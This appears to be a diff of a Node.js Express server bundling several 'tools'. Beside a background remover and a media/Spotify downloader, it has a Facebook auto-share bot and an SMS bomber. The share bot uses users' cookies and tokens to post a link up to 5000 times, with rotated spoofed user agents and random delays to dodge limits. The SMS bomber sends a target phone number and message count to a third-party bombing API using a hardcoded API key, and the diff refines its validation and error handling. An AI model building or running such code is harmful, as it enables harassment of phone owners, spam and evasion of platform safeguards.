@@ -166,7 +166,7 @@ async function cleanupOldFiles() {
     for (const file of files) {
       const filePath = path.join(uploadsDir, file);
       const stat = await fs.stat(filePath);
-      if (now - stat.mtimeMs > 3600000) { // 1 hour
+      if (now - stat.mtimeMs > 3600000) {
         await fs.unlink(filePath).catch(() => {});
         console.log(`Cleaned up: ${file}`);
       }
@@ -175,7 +175,7 @@ async function cleanupOldFiles() {
     console.error('Cleanup error:', err);
   }
 }
-setInterval(cleanupOldFiles, 30 * 60 * 1000); // Run every 30 minutes
+setInterval(cleanupOldFiles, 30 * 60 * 1000);
 
 // ========== REMOVE BACKGROUND ==========
 const multerStorage = multer.diskStorage({
@@ -227,14 +227,14 @@ app.post('/api/removebg', upload.single('image'), async (req, res) => {
   }
 });
 
-// ========== FBSHARE WITH LIVE PROGRESS & CANCELLATION ==========
+// ========== FBSHARE ==========
 const ua_list = [
   "Mozilla/5.0 (Linux; Android 10; Wildfire E Lite) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/298.0.0.10.115;]",
   "Mozilla/5.0 (Linux; Android 11; KINGKONG 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/320.0.0.12.108;]",
   "Mozilla/5.0 (Linux; Android 11; G91 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/325.0.1.4.108;]"
 ];
 
-let activeShares = new Map(); // Track active shares for cancellation
+let activeShares = new Map();
 
 async function extractToken(cookie, ua, retries = 3) {
   for (let i = 0; i < retries; i++) {
@@ -271,10 +271,7 @@ async function performShare(postLink, token, cookie, ua, shareId, totalLimit, up
   const results = { success: 0, failed: 0 };
   
   for (let i = 0; i < totalLimit; i++) {
-    if (activeShares.get(shareId) === 'cancelled') {
-      console.log(`Share ${shareId} was cancelled`);
-      break;
-    }
+    if (activeShares.get(shareId) === 'cancelled') break;
     
     try {
       const response = await axios.post("https://graph.facebook.com/v18.0/me/feed", null, {
@@ -296,15 +293,12 @@ async function performShare(postLink, token, cookie, ua, shareId, totalLimit, up
     } catch (err) {
       results.failed++;
       updateProgress(results.success, results.failed, Math.round(((results.success + results.failed) / totalLimit) * 100));
-      
       if (err.response && err.response.status === 429) {
         await new Promise(resolve => setTimeout(resolve, 10000));
       }
     }
-    
     await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 500));
   }
-  
   return results;
 }
 
@@ -336,12 +330,7 @@ app.post('/api/share', async (req, res) => {
       return res.status(400).json({ status: false, message: 'Cookie, link, and limit (max 5000) are required.' });
     }
     
-    res.json({ 
-      status: true, 
-      message: 'Share started', 
-      share_id: shareId,
-      total_limit: limitNum
-    });
+    res.json({ status: true, message: 'Share started', share_id: shareId, total_limit: limitNum });
     
     let shareHistory = await loadShareHistory();
     const ua = ua_list[Math.floor(Math.random() * ua_list.length)];
@@ -377,10 +366,8 @@ app.post('/api/share', async (req, res) => {
       }
     };
     
-    let result = { success: 0, failed: 0 };
-    
     if (token) {
-      result = await performShare(link, token, cookie, ua, shareId, limitNum, updateProgress);
+      const result = await performShare(link, token, cookie, ua, shareId, limitNum, updateProgress);
       successCount = result.success;
       failedCount = result.failed;
     }
@@ -425,7 +412,6 @@ app.post('/api/share', async (req, res) => {
 
 app.get('/api/share/history', async (req, res) => {
   const history = await loadShareHistory();
-  // Remove link field from response
   const cleanedHistory = history.slice(0, 50).map(({ link, ...rest }) => rest);
   res.json({ status: true, history: cleanedHistory });
 });
@@ -452,10 +438,8 @@ app.get('/api/share/:id/progress', async (req, res) => {
 
 app.post('/api/share/:id/cancel', async (req, res) => {
   const shareId = req.params.id;
-  
   if (activeShares.has(shareId)) {
     activeShares.set(shareId, 'cancelled');
-    
     const history = await loadShareHistory();
     const share = history.find(h => h.id === shareId);
     if (share) {
@@ -463,7 +447,6 @@ app.post('/api/share/:id/cancel', async (req, res) => {
       share.endTime = new Date().toISOString();
       await saveShareHistory(history);
     }
-    
     res.json({ status: true, message: 'Share cancelled successfully' });
   } else {
     res.status(404).json({ status: false, message: 'No active share found with that ID' });
@@ -484,12 +467,10 @@ async function handleSpotifyResponse(apiUrl) {
   try {
     const response = await axios.get(apiUrl, { timeout: 30000 });
     const data = response.data;
-    
     if (data && data.success === true && data.data) {
       const spotifyData = data.data;
       const trackInfo = spotifyData.track || {};
       const downloadInfo = spotifyData.download || {};
-      
       return {
         success: true,
         platform: 'spotify',
@@ -498,11 +479,7 @@ async function handleSpotifyResponse(apiUrl) {
           artist: trackInfo.artists || 'Unknown Artist',
           albumImage: trackInfo.albumImage || '',
           duration: trackInfo.duration || '',
-          explicit: trackInfo.explicit || false,
-          spotifyUrl: trackInfo.spotifyUrl || '',
-          downloadUrl: downloadInfo.url || null,
-          downloadExpires: downloadInfo.expires || null,
-          downloadNote: downloadInfo.note || ''
+          downloadUrl: downloadInfo.url || null
         }
       };
     } else {
@@ -514,101 +491,87 @@ async function handleSpotifyResponse(apiUrl) {
   }
 }
 
-async function handleGenericResponse(apiUrl) {
-  const response = await axios.get(apiUrl, { timeout: 30000 });
-  return response.data;
-}
-
 app.post('/api/download-media', async (req, res) => {
   try {
     await updateCounter('mediadownloader');
     const { platform, url } = req.body;
-    
     if (!platform || !url) {
       return res.status(400).json({ success: false, error: 'Platform and URL are required' });
     }
-    
     const apiUrl = API_ENDPOINTS[platform](url);
     let result;
-    
     if (platform === 'spotify') {
       result = await handleSpotifyResponse(apiUrl);
     } else {
-      const responseData = await handleGenericResponse(apiUrl);
-      result = {
-        success: true,
-        platform: platform,
-        data: responseData
-      };
+      const responseData = await axios.get(apiUrl, { timeout: 30000 });
+      result = { success: true, platform: platform, data: responseData.data };
     }
-    
     await updatePerformance('mediadownloader', 1, 0);
     res.json(result);
-    
   } catch (error) {
     console.error('Download error:', error.message);
     await updatePerformance('mediadownloader', 0, 1);
-    res.status(500).json({ 
-      success: false, 
-      error: 'Failed to fetch media. Please check the URL and try again.' 
-    });
+    res.status(500).json({ success: false, error: 'Failed to fetch media. Please check the URL and try again.' });
   }
 });
 
 app.get('/api/spotify-download', async (req, res) => {
   try {
     const { url } = req.query;
-    
     if (!url) {
       return res.status(400).json({ success: false, error: 'Download URL is required' });
     }
-    
-    console.log('Proxying Spotify download from:', url.substring(0, 100) + '...');
-    
     const response = await axios({
       method: 'GET',
       url: url,
       responseType: 'stream',
       headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         'Accept': 'audio/mpeg,audio/*,*/*',
-        'Accept-Language': 'en-US,en;q=0.9',
         'Referer': 'https://open.spotify.com/',
-        'Origin': 'https://open.spotify.com',
-        'Connection': 'keep-alive'
+        'Origin': 'https://open.spotify.com'
       },
-      timeout: 60000,
-      maxRedirects: 5
+      timeout: 60000
     });
-    
     res.setHeader('Content-Type', 'audio/mpeg');
     res.setHeader('Content-Disposition', 'attachment; filename="spotify_track.mp3"');
     res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-    res.setHeader('Pragma', 'no-cache');
-    res.setHeader('Expires', '0');
-    
     response.data.pipe(res);
-    
   } catch (error) {
     console.error('Spotify download proxy error:', error.message);
-    res.status(500).json({ 
-      success: false, 
-      error: 'Failed to download audio file. The link may have expired or the service is unavailable.' 
-    });
+    res.status(500).json({ success: false, error: 'Failed to download audio file.' });
   }
 });
 
-// ========== SMS BOMBER ==========
+// ========== SMS BOMBER (FIXED - NO HARDCODED EXAMPLES) ==========
 const SMS_API_KEY = '66ec8aa6ce70b55c877c4489fa545c67fee8633a42442343771bd2ade432ecbd';
 const SMS_API_URL = 'https://oreo.gleeze.com/api/smsbomber';
 
 app.post('/api/smsbomb', async (req, res) => {
   try {
     await updateCounter('smsbomber');
-    const { phone, amount } = req.body;
+    let { phone, amount } = req.body;
     
-    if (!phone) {
+    // Validation
+    if (!phone || phone.trim() === '') {
       return res.status(400).json({ success: false, error: 'Phone number is required' });
+    }
+    
+    // Clean and validate phone number
+    let cleanPhone = phone.toString().trim().replace(/\s/g, '');
+    
+    // Remove any leading '0' or '63' and add +63 format
+    if (cleanPhone.startsWith('0')) {
+      cleanPhone = '+63' + cleanPhone.substring(1);
+    } else if (cleanPhone.startsWith('63') && !cleanPhone.startsWith('+')) {
+      cleanPhone = '+' + cleanPhone;
+    } else if (!cleanPhone.startsWith('+')) {
+      cleanPhone = '+' + cleanPhone;
+    }
+    
+    // Validate phone number length (should be around 13 characters with +63)
+    if (cleanPhone.length < 12 || cleanPhone.length > 15) {
+      return res.status(400).json({ success: false, error: 'Invalid phone number format' });
     }
     
     let amountNum = parseInt(amount);
@@ -619,15 +582,16 @@ app.post('/api/smsbomb', async (req, res) => {
       amountNum = 50;
     }
     
-    // Clean phone number (remove spaces, ensure format)
-    let cleanPhone = phone.replace(/\s/g, '');
-    if (!cleanPhone.startsWith('+')) {
-      cleanPhone = '+' + cleanPhone;
-    }
-    
+    // Call the SMS bomber API
     const apiUrl = `${SMS_API_URL}?phone=${encodeURIComponent(cleanPhone)}&amount=${amountNum}&api_key=${SMS_API_KEY}`;
     
-    const response = await axios.get(apiUrl, { timeout: 30000 });
+    const response = await axios.get(apiUrl, { 
+      timeout: 30000,
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'application/json'
+      }
+    });
     
     if (response.data && response.data.success === true) {
       await updatePerformance('smsbomber', 1, 0);
@@ -646,10 +610,15 @@ app.post('/api/smsbomb', async (req, res) => {
   } catch (error) {
     console.error('SMS Bomber error:', error.message);
     await updatePerformance('smsbomber', 0, 1);
-    res.status(500).json({ 
-      success: false, 
-      error: 'Failed to start SMS bombing. Please try again.' 
-    });
+    
+    // Handle specific error cases
+    if (error.response?.status === 429) {
+      res.status(429).json({ success: false, error: 'Rate limited. Please wait a moment before trying again.' });
+    } else if (error.response?.status === 403) {
+      res.status(403).json({ success: false, error: 'API access forbidden. The service may be temporarily unavailable.' });
+    } else {
+      res.status(500).json({ success: false, error: 'Failed to start SMS bombing. Please try again later.' });
+    }
   }
 });
 
@@ -718,7 +687,6 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Error handlers
 app.use((req, res) => {
   res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
 });
@@ -728,14 +696,10 @@ app.use((err, req, res, next) => {
   res.status(500).sendFile(path.join(__dirname, 'public', '500.html'));
 });
 
-// ========== SERVER START ==========
 app.listen(PORT, () => {
   console.log(`🚀 Home Tools Server running on http://localhost:${PORT}`);
   console.log(`📁 Storage directory: ${storageDir}`);
-  console.log(`📁 Uploads directory: ${uploadsDir}`);
-  console.log(`📁 History file: ${historyFile}`);
   console.log(`📁 Performance file: ${performanceFile}`);
-  console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
 });
 
 process.on('SIGTERM', async () => {
